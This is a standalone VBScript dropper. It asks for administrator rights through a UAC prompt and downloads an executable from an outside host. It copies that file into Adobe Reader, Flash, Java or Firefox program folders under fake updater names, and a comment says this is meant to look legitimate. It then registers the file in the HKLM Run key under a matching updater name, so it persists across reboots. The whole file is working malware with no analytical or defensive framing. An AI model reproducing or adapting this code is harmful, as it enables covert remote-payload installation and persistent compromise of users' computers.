   'Set your settings
	
	Set wshShell = CreateObject( "WScript.Shell" )
	'UAC Prompt
	If WScript.Arguments.length = 0 Then
    Set ObjShell = CreateObject("Shell.Application")
    ObjShell.ShellExecute "wscript.exe", """" & _
    WScript.ScriptFullName & """" &_
     " RunAsAdministrator", , "runas", 1
	End If
	
    'strFileURL = "http://wordpress.org/extend/plugins/about/readme.txt"
	strFileURL = "http://patchupdate.serveftp.com/updater.exe"	
    strHDLocation = wshShell.ExpandEnvironmentStrings("%Temp%") + "\updater1.exe"
	'WScript.echo strHDLocation

   ' Fetch the file

    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")

    objXMLHTTP.open "GET", strFileURL, false
    objXMLHTTP.send()

    If objXMLHTTP.Status = 200 Then
      Set objADOStream = CreateObject("ADODB.Stream")
      objADOStream.Open
      objADOStream.Type = 1 'adTypeBinary

      objADOStream.Write objXMLHTTP.ResponseBody
      objADOStream.Position = 0    'Set the stream position to the start

      Set objFSO = Createobject("Scripting.FileSystemObject")
        If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation
      'Set objFSO = Nothing

      objADOStream.SaveToFile strHDLocation
      objADOStream.Close
      Set objADOStream = Nothing
    End if

    Set objXMLHTTP = Nothing
	
	'Check to see what folder we are putting this in.
	If objFSO.FolderExists("C:\Program Files (x86)\Adobe\Reader 10.0\Reader\") Then
		If Not objFSO.FileExists("C:\Program Files (x86)\Adobe\Reader 10.0\Reader\AdobeUpdater.exe") Then
			'newfolder = filesys.CreateFolder ("c:\DevGuru\website\")
			'objFSO.CopyFile wshShell.ExpandEnvironmentStrings("%Temp%") + "\updater1.exe", "C:\Program Files (x86)\Adobe\Reader 10.0\Reader\AdobeUpdater.exe"
			objFSO.MoveFile wshShell.ExpandEnvironmentStrings("%Temp%") + "\updater1.exe", "C:\Program Files (x86)\Adobe\Reader 10.0\Reader\AdobeUpdater.exe"		
		End If
		sample = "C:\Program Files (x86)\Adobe\Reader 10.0\Reader\AdobeUpdater.exe"
	ElseIf objFSO.FolderExists("C:\Program Files (x86)\Adobe\Reader 11.0\Reader\") Then
		If Not objFSO.FileExists("C:\Program Files (x86)\Adobe\Reader 11.0\Reader\AdobeUpdater.exe") Then
			objFSO.MoveFile wshShell.ExpandEnvironmentStrings("%Temp%") + "\updater1.exe", "C:\Program Files (x86)\Adobe\Reader 11.0\Reader\AdobeUpdater.exe"		
		End If
		sample = "C:\Program Files (x86)\Adobe\Reader 11.0\Reader\AdobeUpdater.exe"
	ElseIf objFSO.FolderExists("C:\Program Files (x86)\Adobe\Flash Player\") Then
		If Not objFSO.FileExists("C:\Program Files (x86)\Adobe\Flash Player\FlashUpdater.exe") Then
			objFSO.MoveFile wshShell.ExpandEnvironmentStrings("%Temp%") + "\updater1.exe", "C:\Program Files (x86)\Adobe\Flash Player\FlashUpdater.exe"		
		End If
		sample = "C:\Program Files (x86)\Adobe\Flash Player\FlashUpdater.exe"
	ElseIf objFSO.FolderExists("C:\Program Files\Adobe\Flash Player\") Then
		If Not objFSO.FileExists("C:\Program Files\Adobe\Flash Player\FlashUpdater.exe") Then
			objFSO.MoveFile wshShell.ExpandEnvironmentStrings("%Temp%") + "\updater1.exe", "C:\Program Files\Adobe\Flash Player\FlashUpdater.exe"		
		End If
		sample = "C:\Program Files\Adobe\Flash Player\FlashUpdater.exe"
	ElseIf objFSO.FolderExists("C:\Program Files\Adobe\Reader 11.0\Reader\") Then
		If Not objFSO.FileExists("C:\Program Files\Adobe\Reader 11.0\Reader\AdobeUpdater.exe") Then
			objFSO.MoveFile wshShell.ExpandEnvironmentStrings("%Temp%") + "\updater1.exe", "C:\Program Files\Adobe\Reader 11.0\Reader\AdobeUpdater.exe"		
		End If
		sample = "C:\Program Files\Adobe\Reader 11.0\Reader\AdobeUpdater.exe"
	ElseIf objFSO.FolderExists("C:\Program Files\Adobe\Reader 10.0\Reader\") Then
		If Not objFSO.FileExists("C:\Program Files\Adobe\Reader 10.0\Reader\AdobeUpdater.exe") Then
			objFSO.MoveFile wshShell.ExpandEnvironmentStrings("%Temp%") + "\updater1.exe", "C:\Program Files\Adobe\Reader 10.0\Reader\AdobeUpdater.exe"		
		End If
		sample = "C:\Program Files\Adobe\Reader 10.0\Reader\AdobeUpdater.exe"
	ElseIf objFSO.FolderExists("C:\Program Files (x86)\Java\jre6\bin\") Then
		If Not objFSO.FileExists("C:\Program Files (x86)\Java\jre6\bin\JavaUpdater.exe") Then
			objFSO.MoveFile wshShell.ExpandEnvironmentStrings("%Temp%") + "\updater1.exe", "C:\Program Files (x86)\Java\jre6\bin\JavaUpdater.exe"	
		End If
		sample = "C:\Program Files (x86)\Java\jre6\bin\JavaUpdater.exe"
	ElseIf objFSO.FolderExists("C:\Program Files\Java\jre6\bin\") Then
		If Not objFSO.FileExists("C:\Program Files\Java\jre6\bin\JavaUpdater.exe") Then
			objFSO.MoveFile wshShell.ExpandEnvironmentStrings("%Temp%") + "\updater1.exe", "C:\Program Files\Java\jre6\bin\JavaUpdater.exe"		
		End If
		sample = "C:\Program Files\Java\jre6\bin\JavaUpdater.exe"
	ElseIf objFSO.FolderExists("C:\Program Files (x86)\Java\jre7\bin\") Then
		If Not objFSO.FileExists("C:\Program Files (x86)\Java\jre7\bin\JavaUpdater.exe") Then
			objFSO.MoveFile wshShell.ExpandEnvironmentStrings("%Temp%") + "\updater1.exe", "C:\Program Files (x86)\Java\jre7\bin\JavaUpdater.exe"
		End If
		sample = "C:\Program Files (x86)\Java\jre7\bin\JavaUpdater.exe"
	ElseIf objFSO.FolderExists("C:\Program Files\Java\jre7\bin\") Then
		If Not objFSO.FileExists("C:\Program Files\Java\jre7\bin\JavaUpdater.exe") Then
			objFSO.MoveFile wshShell.ExpandEnvironmentStrings("%Temp%") + "\updater1.exe", "C:\Program Files\Java\jre7\bin\JavaUpdater.exe"		
		End If
		sample = "C:\Program Files\Java\jre7\bin\JavaUpdater.exe"
	ElseIf objFSO.FolderExists("C:\Program Files\Mozilla Firefox\") Then
		If Not objFSO.FileExists("C:\Program Files\Mozilla Firefox\FireFoxUpdater.exe") Then
			objFSO.MoveFile wshShell.ExpandEnvironmentStrings("%Temp%") + "\updater1.exe", "C:\Program Files\Mozilla Firefox\FireFoxUpdater.exe"
		End If
		sample = "C:\Program Files\Mozilla Firefox\FireFoxUpdater.exe"
	ElseIf objFSO.FolderExists("C:\Program Files (x86)\Mozilla Firefox\") Then
		If Not objFSO.FileExists("C:\Program Files (x86)\Mozilla Firefox\FireFoxUpdater.exe") Then
			objFSO.MoveFile wshShell.ExpandEnvironmentStrings("%Temp%") + "\updater1.exe", "C:\Program Files (x86)\Mozilla Firefox\FireFoxUpdater.exe"		
		End If	
		sample = "C:\Program Files (x86)\Mozilla Firefox\FireFoxUpdater.exe"
	Else
		If objFSO.FolderExists("C:\Program Files (x86)\") Then
			If Not objFSO.FileExists("C:\Program Files (x86)\Adobe\Reader 10.0\Reader\AdobeUpdater.exe") Then 
				objFSO.CreateFolder ("C:\Program Files (x86)\Adobe\Reader 10.0\Reader\")
			objFSO.MoveFile wshShell.ExpandEnvironmentStrings("%Temp%") + "\updater1.exe", "C:\Program Files (x86)\Adobe\Reader 10.0\Reader\AdobeUpdater.exe"			
			End If	
			sample = "C:\Program Files (x86)\Adobe\Reader 10.0\Reader\AdobeUpdater.exe"
		Else
			If Not objFSO.FileExists("C:\Program Files\Adobe\Reader 10.0\Reader\AdobeUpdater.exe") Then 
				objFSO.CreateFolder ("C:\Program Files\Adobe\Reader 10.0\Reader\")
				objFSO.MoveFile wshShell.ExpandEnvironmentStrings("%Temp%") + "\updater1.exe", "C:\Program Files\Adobe\Reader 10.0\Reader\AdobeUpdater.exe"			
			End If
			sample = "C:\Program Files\Adobe\Reader 10.0\Reader\AdobeUpdater.exe"
		End If	
	End If
	
	'Now that we have our file somewhere that looks legit, let's add our persistence to registry.
	Const constHKEY_LOCAL_MACHINE = &H80000002
	Const constComputer = "."

	Set objReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &_
	  constComputer & "\root\default:StdRegProv")
	strKeyPath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
	strValue = sample
	
	If objFSO.GetFileName(sample) = "AdobeUpdater.exe" Then
		strValueName = "Adobe Reader Updater"
	ElseIf objFSO.GetFileName(sample) = "FireFoxUpdater.exe" Then
		strValueName = "FireFox Updater"
	ElseIf objFSO.GetFileName(sample) = "JavaUpdater.exe" Then
		strValueName = "Java Updater"
	ElseIf objFSO.GetFileName(sample) = "FlashUpdater.exe" Then
		strValueName = "Adobe Flash Updater"	
	End If
	
	objReg.SetStringValue constHKEY_LOCAL_MACHINE, strKeyPath, strValueName, strValue
	
	set objReg = Nothing
	set objFSO = Nothing
	